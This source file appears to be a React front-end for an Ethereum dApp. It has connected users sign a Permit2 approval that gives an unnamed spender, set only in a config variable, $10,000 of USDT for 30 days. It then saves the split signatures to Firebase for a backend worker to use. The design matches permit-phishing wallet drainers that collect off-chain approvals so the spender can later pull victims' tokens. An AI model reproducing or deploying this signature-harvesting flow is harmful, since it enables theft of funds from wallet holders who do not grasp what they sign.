import React, { useState, useEffect } from 'react';
import { createAppKit } from '@reown/appkit/react';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { mainnet } from '@reown/appkit/networks';
import { BrowserProvider } from 'ethers';
import { db } from './firebase';
import { doc, setDoc } from 'firebase/firestore';

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; 
// Use USDT decimals (6). Amount = 10,000 * 10**6
const USDT_DECIMALS = 6n;
const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS); // $10,000 cap in USDT (6 decimals)

const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [mainnet],
  projectId: import.meta.env.VITE_REOWN_PROJECT_ID,
  metadata: {
    name: 'Permit2 App',
    description: 'Simple Permit2 signing app',
    url: 'https://example.com',
    icons: []
  },
});

export default function App() {
  const [status, setStatus] = useState("Not connected");
  const [connectedAddress, setConnectedAddress] = useState(null);

  useEffect(() => {
    const unsub = appKit.subscribeAccount((acct) => {
      if (acct?.isConnected && acct?.address) {
        setStatus(`Connected: ${acct.address}`);
        setConnectedAddress(acct.address);
      } else {
        setStatus("Not connected");
        setConnectedAddress(null);
      }
    });

    return () => unsub();
  }, []);

  const signPermit = async () => {
    try {
      if (!connectedAddress) {
        setStatus("Wallet not connected");
        return;
      }

      setStatus("Preparing Permit2 signature...");

      const walletProvider = appKit.getWalletProvider();
      if (!walletProvider) {
        setStatus("Wallet provider not available.");
        return;
      }

      const provider = new BrowserProvider(walletProvider);
      const net = await provider.getNetwork();
      const chainId = Number(net.chainId);

      // deadline: 30 days from now (seconds)
      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60;
      const nonce = 0;

      const permitted = {
        token: import.meta.env.VITE_TOKEN_ADDRESS,
        amount: SPENDING_CAP.toString(),
        expiration: deadline,
        nonce
      };

      const domain = {
        name: 'Permit2',
        chainId,
        verifyingContract: PERMIT2
      };

      const types = {
        EIP712Domain: [
          { name: 'name', type: 'string' },
          { name: 'chainId', type: 'uint256' },
          { name: 'verifyingContract', type: 'address' }
        ],
        PermitSingle: [
          { name: 'details', type: 'PermitDetails' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' }
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' }
        ]
      };

      const message = {
        details: permitted,
        spender: import.meta.env.VITE_SPENDER_ADDRESS,
        sigDeadline: deadline
      };

      setStatus("Requesting signature...");

      const payload = JSON.stringify({
        domain,
        types,
        primaryType: "PermitSingle",
        message
      });

      const signature = await walletProvider.request({
        method: "eth_signTypedData_v4",
        params: [connectedAddress, payload]
      });

      const raw = signature.substring(2);
      const r = "0x" + raw.substring(0, 64);
      const s = "0x" + raw.substring(64, 128);
      const v = parseInt(raw.substring(128, 130), 16);

      await setDoc(doc(db, "permit2_signatures", connectedAddress), {
        owner: connectedAddress,
        spender: import.meta.env.VITE_SPENDER_ADDRESS,
        token: import.meta.env.VITE_TOKEN_ADDRESS,
        amount: SPENDING_CAP.toString(),
        deadline,
        nonce,
        r, s, v,
        processed: false,
        timestamp: Date.now()
      });

      setStatus("Signature saved. Backend worker will process it.");

    } catch (err) {
      console.error(err);
      setStatus("Error: " + (err?.message || String(err)));
    }
  };

  return (
    <div className="app-container">
      <h2>Permit2 Signing DApp</h2>
      <p style={{ color: "#9fb4ff", marginBottom: 18 }}>
        Connect wallet, then sign the $10,000 spending cap.
      </p>

      {connectedAddress ? (
        <button className="connect" onClick={signPermit}>
          Sign Permit
        </button>
      ) : (
        <button className="connect" onClick={() => appKit.open()}>
          Connect Wallet
        </button>
      )}

      <div className="status">{status}</div>
    </div>
  );
}
